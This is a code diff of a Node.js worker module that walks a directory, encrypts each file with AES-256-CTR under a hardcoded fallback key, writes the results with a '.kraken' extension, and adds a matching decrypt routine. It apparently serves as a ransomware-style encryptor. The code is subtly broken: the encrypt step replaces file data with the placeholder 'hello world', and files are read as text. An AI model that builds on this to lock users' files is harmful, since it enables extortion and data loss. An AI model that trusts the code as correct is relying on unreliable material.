@@ -1,20 +1,23 @@
 // With ❤ by GuttyMora
+const {parentPort} = require('worker_threads');
 require('dotenv').config();
-const process = require('process');
-const path = require('path');
 const fs = require('fs');
 const crypto = require('crypto');
 const {Buffer} = require('buffer');
 
-const DEFAULT_DIRECTORY_NAME = require.main.filename;
 const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY ?? 'my9t8ehq7rg4ht65fgd0bbe57w98hw03p1qz4';
 const ENCRYPTED_FILE_EXTENSION = process.env.ENCRYPTED_FILE_EXTENSION ?? 'kraken';
 
 class FileProcessor {
-    async getFiles(folder = null) {
+    constructor() {
+        this.algorithm = 'aes-256-ctr';
+        this.key = crypto.createHash('sha256').update(ENCRYPTION_KEY).digest('base64').substr(0, 32);
+    }
+
+    async getFiles(directory = null) {
         console.log('[FileProcessor] - getFiles()');
 
-        const directoryPath = path.join(path.dirname(DEFAULT_DIRECTORY_NAME), folder ?? '');
+        const directoryPath = directory ?? process.cwd();
         return await new Promise((resolve, reject) => {
             fs.readdir(directoryPath, async (err, files) => {
                 if (err) {
@@ -23,13 +26,17 @@ class FileProcessor {
                 } else {
                     const fileList = [];
                     for (const file of files) {
-                        const stats = await this.getFileStats(file);
-                        fileList.push({
-                            name: file,
-                            directoryPath: directoryPath,
-                            isDirectory: stats.isDirectory(),
-                            stats: stats
-                        });
+                        try {
+                            const stats = await this.getFileStats(`${directoryPath}\\${file}`);
+                            fileList.push({
+                                name: file,
+                                directoryPath: directoryPath,
+                                isDirectory: stats.isDirectory(),
+                                stats: stats
+                            });
+                        } catch (err) {
+                            console.error('[!] Error getting stats:', err);
+                        }
                     }
                     resolve([directoryPath, fileList]);
                 }
@@ -54,39 +61,95 @@ class FileProcessor {
         console.log('[FileProcessor] - encrypt()');
 
         return await new Promise((resolve, reject) => {
-            fs.readFile(`${file.directoryPath}\\${file.name}`, 'utf8', async (err, data) => {
+            fs.readFile(`${file.directoryPath}\\${file.name}`, {encoding: 'utf8'}, async (err, data) => {
                 if (err) {
                     console.error('[!] Unable to read file:', err);
                     reject(null);
                 } else {
-                    const algorithm = 'aes-256-ctr';
-                    let key = ENCRYPTION_KEY;
-                    key = crypto.createHash('sha256').update(key).digest('base64').substr(0, 32);
+                    try {
+                        data = Buffer.from('hello world', 'utf8');
+                        const extension = (file.name.split('.'))[1];
+                        const extensionLength = extension.length;
+                        const extensionBuff = Buffer.from(`${extensionLength}${extension}`, 'utf8');
+                        // initialization vector
+                        const iv = crypto.randomBytes(8).toString('hex');
+                        const ivBuffer = Buffer.from(iv);
 
-                    // initialization vector
-                    const iv = crypto.randomBytes(16);
-                    // Create a new cipher using the algorithm, key, and iv
-                    const cipher = crypto.createCipheriv(algorithm, key, iv);
+                        // Create a new cipher using the algorithm, key, and iv
+                        const cipher = crypto.createCipheriv(this.algorithm, this.key, iv);
 
-                    // Create the new (encrypted) buffer
-                    const buffer = Buffer.concat([iv, cipher.update(data), cipher.final()]);
+                        // Create the new encrypted buffer
+                        const encryptedBuffer = Buffer.concat([ivBuffer, extensionBuff, cipher.update(data), cipher.final()]);
 
-                    const encryptedFileName = await this.createEncryptFile((file.name.split('.')[0]), buffer);
-                    resolve(encryptedFileName);
+                        const encryptedFileName = this.createFile(`${(file.name.split('.')[0])}.${ENCRYPTED_FILE_EXTENSION}`, encryptedBuffer);
+                        resolve(encryptedFileName);
+                    } catch (err) {
+                        console.error('[!] Unable to encrypt file:', err);
+                        reject(err);
+                    }
                 }
             });
         });
     }
 
-    async createEncryptFile(fileName, buffer) {
-        console.log('[FileProcessor] - createEncryptFile()');
+    async decrypt(file) {
+        console.log('[FileProcessor] - decrypt()');
 
-        const path = `${fileName}.${ENCRYPTED_FILE_EXTENSION}`;
-        const fileDescriptor = fs.openSync(path, 'w');
-        fs.writeSync(fileDescriptor, buffer, 0, buffer.length, null);
+        return await new Promise((resolve, reject) => {
+            fs.readFile(`${file.directoryPath}\\${file.name}`, {encoding: 'utf8'}, async (err, data) => {
+                if (err) {
+                    console.error('[!] Unable to read file:', err);
+                    reject(null);
+                } else {
+                    try {
+                        const iv = data.slice(0, 16);
+                        const extensionLength = parseInt(data.slice(16, 17).toString());
+                        const extension = data.slice(17, 17 + extensionLength);
+                        const encryptedData = data.slice(17 + extensionLength);
 
-        return path;
+                        // Create a new decipher using the algorithm, key, and iv
+                        const decipher = crypto.createCipheriv(this.algorithm, this.key, iv);
+                        // Decrypted buffer
+                        let decryptedBuffer = Buffer.concat([decipher.update(encryptedData), decipher.final()]);
+
+                        const decryptedFileName = await this.createFile(`${(file.name.split('.')[0])}.${extension.toString()}`, decryptedBuffer);
+                        resolve(decryptedFileName);
+                    } catch (err) {
+                        console.error('[!] Unable to decrypt file:', err);
+                        reject(null);
+                    }
+                }
+            });
+        });
+    }
+
+    createFile(fileName, buffer) {
+        console.log('[FileProcessor] - createFile()');
+
+        const fileDescriptor = fs.openSync(fileName, 'w');
+        fs.writeSync(fileDescriptor, buffer);
+
+        return fileName;
     }
 }
+
+// Listen work thread events
+parentPort.on('message', async data => {
+    const processor = new FileProcessor();
+
+    switch (data.method) {
+        case 'getFiles':
+            parentPort.postMessage(await processor.getFiles(data.folder));
+            break;
+        case 'encrypt':
+            parentPort.postMessage(await processor.encrypt(data.file));
+            break;
+        case 'decrypt':
+            parentPort.postMessage(await processor.decrypt(data.file));
+            break;
+        default:
+            console.error('[!] FileProcessor error: Not method defined');
+    }
+});
 
 module.exports = FileProcessor;
